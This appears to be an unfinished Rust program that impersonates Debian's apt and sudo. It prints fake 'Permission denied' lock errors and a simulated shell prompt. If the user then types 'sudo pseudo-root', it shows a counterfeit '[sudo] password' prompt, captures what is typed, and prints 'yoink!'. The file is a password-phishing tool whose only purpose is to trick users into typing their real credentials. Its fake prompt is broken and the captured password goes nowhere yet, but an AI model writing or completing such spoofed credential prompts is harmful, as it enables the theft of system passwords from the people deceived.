use std::env;
use std::io::{
    self,
    Write
};
use regex::Regex;

fn main() {
    let package_name = "pseudo-root";

    let username = match env::var("USER") {
        Ok(val) => val,
        Err(e) => String::from("root"),
    };

    // print standard linux aptitude permissions error message
    // fixme - relevant lock failure
    println!(
        "E: Could not open lock file /var/lib/{}/lock-frontend - open (13: Permission denied)",
        package_name
    );
    println!(
        "E: Unable to acquire the dpkg frontend lock (/var/lib/{}/lock-frontend), are you root?",
        package_name
    );

    // return to simulated prompt
    let mut next_command = String::new();
    // fixme - render prompt
    print!(r"\[\e]0;\u@\h: \w\a\]${}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ ", "{debian_chroot:+($debian_chroot)}");
    let _ = io::stdout().flush();
    io::stdin().read_line(&mut next_command);

    // check if sudo was attempted
    let pattern = format!("^sudo {}", package_name);
    let sudo = Regex::new(pattern.as_str()).unwrap();
    if sudo.is_match(next_command.as_str()) {
        // prompt for root password
        let mut attempts = 3;
        let mut password: Option<String> = None;

        while password.is_none() && attempts > 0 {
            let mut password_attempt = String::new();
            print!("[sudo] password for {}: ", username);
            let _ = io::stdout().flush();
            io::stdin().read_line(&mut password_attempt);
            // fixme - validate password: Sorry, try again.
            password = Some(password_attempt);
            attempts -= 1;
        }

        println!("yoink!");
    }
}
